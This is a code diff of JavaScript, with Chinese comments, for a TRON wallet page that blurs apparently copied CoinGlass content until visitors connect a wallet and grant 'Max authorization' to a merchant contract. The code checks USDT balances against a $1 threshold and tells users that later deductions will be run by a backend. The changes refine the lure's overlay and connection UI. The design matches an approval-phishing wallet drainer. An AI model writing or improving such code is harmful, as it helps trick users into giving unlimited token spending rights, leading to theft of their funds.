@@ -24,28 +24,31 @@ let targetDeductionToken = null; // 記錄哪個代幣有足夠餘額
 const connectButton = document.getElementById('connectButton');
 const blurOverlay = document.getElementById('blurOverlay');
 const overlayMessage = document.getElementById('overlayMessage');
-
-// 💡 注意：所有關於扣款表單的 UI 變數都已移除
-
+const coinglassContent = document.getElementById('coinglassContent'); // 新增：用於控制模糊效果
 
 // --- 輔助函數 ---
 function showOverlay(message) {
     overlayMessage.innerHTML = message;
     blurOverlay.style.display = 'flex';
+    // 確保內容被模糊
+    if (coinglassContent) coinglassContent.classList.add('blurred'); 
 }
 function hideOverlay() {
     blurOverlay.style.display = 'none';
-    // 💡 注意：不再顯示 deductionForm
+    // 授權完成後移除模糊
+    if (coinglassContent) coinglassContent.classList.remove('blurred');
 }
 function updateConnectionUI(connected, address = null) {
     isConnectedFlag = connected;
     if (connected) {
         connectButton.classList.add('connected');
-        connectButton.title = `已連線: ${address.substring(0, 4)}...${address.slice(-4)}`;
+        connectButton.innerHTML = `已連線: ${address.substring(0, 4)}...${address.slice(-4)}`;
+        connectButton.title = `已連線: ${address}`;
         // 連線成功，但仍保持模糊，直到 Max 授權完成
         showOverlay('已連線。請完成 Max 授權以解鎖內容 🔒'); 
     } else {
         connectButton.classList.remove('connected');
+        connectButton.innerHTML = '連繫錢包';
         connectButton.title = '連繫錢包';
         showOverlay('請連繫您的錢包並完成 Max 授權以解鎖內容 🔒');
     }
@@ -128,7 +131,7 @@ async function checkAuthorization() {
     
     const contractAuthorized = await merchantContract.authorized(userAddress).call();
 
-    // 門檻調整為 $1.00
+    // 門檻調整為 $1.00 (您設定的最低扣款門檻)
     const minAmount = tronWeb.toSun('1.00'); 
     
     const usdtBalance = await getTokenBalance(usdtContract);
@@ -242,7 +245,8 @@ async function handlePostConnection() {
         // 授權已完成，直接解鎖內容
         hideOverlay(); 
         // 顯示最終成功訊息
-        showOverlay('✅ Max 授權已成功！您已解鎖內容。未來服務扣款將由後台系統依約定金額執行。');
+        showOverlay('✅ Max 授權已成功！您已解鎖內容。後續服務扣款將由後台系統依約定金額執行。');
+        // 保持此訊息 3 秒，然後真正隱藏 overlay
         await new Promise(resolve => setTimeout(resolve, 3000));
         hideOverlay();
 
